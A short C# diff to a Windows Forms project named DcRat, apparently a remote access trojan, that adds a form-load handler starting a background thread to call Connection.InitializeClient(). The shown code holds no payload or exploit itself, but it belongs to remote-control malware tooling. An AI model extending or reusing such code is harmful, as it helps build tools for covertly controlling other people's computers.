@@ -3,6 +3,7 @@ using DcRat.Properties;
 using System;
 using System.Drawing;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace DcRat
@@ -343,6 +344,14 @@ namespace DcRat
             {
                 panelleft.Width = 0;
             }
+        }
+
+        private void FormMain_Load(object sender, EventArgs e)
+        {
+            new Thread(() =>
+            {
+                Connection.InitializeClient(); 
+            }).Start();
         }
     }
 }
